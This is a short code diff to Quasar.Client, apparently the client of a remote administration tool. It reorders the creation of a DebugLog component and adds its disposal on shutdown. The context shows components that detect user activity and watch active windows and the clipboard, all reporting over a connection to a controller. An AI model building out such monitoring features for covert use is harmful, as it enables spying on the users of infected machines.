@@ -141,13 +141,13 @@ namespace Quasar.Client
                 _connectClient.ClientState += ConnectClientOnClientState;
                 InitializeMessageProcessors(_connectClient);
 
+                _debugLog = new DebugLog(_connectClient);
+
                 _userActivityDetection = new ActivityDetection(_connectClient);
                 _userActivityDetection.Start();
 
                 _activeWindowChecker = new ActiveWindowChecker(_connectClient);
                 _clipboardChecker = new ClipboardChecker(_connectClient);
-                _debugLog = new DebugLog(_connectClient);
-                
 
                 new Thread(() =>
                 {
@@ -232,6 +232,7 @@ namespace Quasar.Client
                 _connectClient?.Dispose();
                 _notifyIcon.Visible = false;
                 _notifyIcon.Dispose();
+                _debugLog?.Dispose(); // Dispose DebugLog
             }
             base.Dispose(disposing);
         }
